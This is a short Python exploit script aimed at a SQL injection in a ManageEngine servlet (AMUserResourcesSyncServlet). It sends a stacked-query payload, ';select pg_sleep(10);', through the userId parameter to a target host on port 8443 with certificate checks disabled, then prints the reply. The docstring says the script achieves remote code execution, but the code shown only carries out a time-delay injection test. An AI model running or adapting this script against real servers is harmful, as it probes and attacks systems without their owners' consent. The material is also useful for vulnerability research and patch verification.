#!/usr/bin/env python3
"""
Author: Aleksa Zatezalo
Date: December 2024
Version: 1.0
Description: RCE exploit for an SQL Injection identified in the ManageEngine AMUserResourceSyncServlet servlet.
"""


import sys
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
	if len(sys.argv) != 2:
		print(f"(+) usage %s <target>" % sys.argv[0])
		print(f"(+) eg: %s target" % sys.argv[0])
		sys.exit(1)
	
	t = sys.argv[1]
	
	sqli = ";select+pg_sleep(10);"

	r = requests.get('https://%s:8443/servlet/AMUserResourcesSyncServlet' % t, 
					  params='ForMasRange=1&userId=1%s' % sqli, verify=False)
	print(r.text)
	print(r.headers)

if __name__ == '__main__':
	main()